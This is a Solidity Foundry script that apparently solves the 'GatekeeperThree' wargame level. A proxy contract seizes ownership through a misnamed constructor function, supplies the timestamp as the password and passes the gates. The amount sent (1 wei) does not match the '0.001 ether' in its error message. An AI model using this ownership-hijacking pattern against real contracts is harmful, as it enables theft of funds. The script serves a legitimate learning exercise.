// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";

interface IGatekeeperThree {
    function getAllowance(uint _password) external;
    function createTrick() external;
    function enter() external;
    function construct0r() external;
}

contract Proxy {

    address target;

    constructor(address target_) {
        target = target_;
    }

    function enter() public {
        IGatekeeperThree(target).construct0r();
        IGatekeeperThree(target).createTrick();
        IGatekeeperThree(target).getAllowance(block.timestamp);
        IGatekeeperThree(target).enter();
    }
}

contract GatekeeperThreeScript is Script {

    address gatekeeperThree = 0xD7819C1F7ED659C3D29Cfd04f22c55a2B740B870;

    function run() public {
        vm.startBroadcast();

        // 1. Send ether to gatekeeper to clear gate 3
        require(payable(gatekeeperThree).send(1), "Failed to send 0.001 ether");

        // 2. Create proxy contract to call gatekeeperThree.enter() (clear gate 1 & 2)
        Proxy proxy = new Proxy(gatekeeperThree);
        proxy.enter();

        vm.stopBroadcast();
    }
}
